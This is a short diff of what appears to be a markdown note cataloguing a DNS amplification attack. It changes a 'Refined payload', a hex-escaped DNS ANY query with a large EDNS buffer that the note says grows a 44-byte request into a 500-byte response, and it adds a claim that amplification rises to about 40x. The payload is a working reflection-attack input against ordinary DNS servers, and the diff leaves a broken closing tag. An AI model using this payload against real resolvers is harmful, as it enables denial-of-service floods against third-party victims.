@@ -7,8 +7,9 @@
 ## Amplification factor: 10-30x
 
 ### Refined payload
-From 44 Byte to 500 Byte
-<pre>C4\75\01\00\00\01\00\00\00\00\00\01\00\00\FF\00\01\00\00\29\23\28\00\00\00\00\00\00\00\00\00\00\00<pre>
+- From 44 Byte to 500 Byte
+- Amplification factor increased to ~40x
+<pre>C4\75\01\00\00\01\00\00\00\00\00\01\00\00\FF\00\01\00\00\29\23\28\00\00\00\00\00\00\00\00\00\00\00</pre>pre>
 
 ### Example response
 
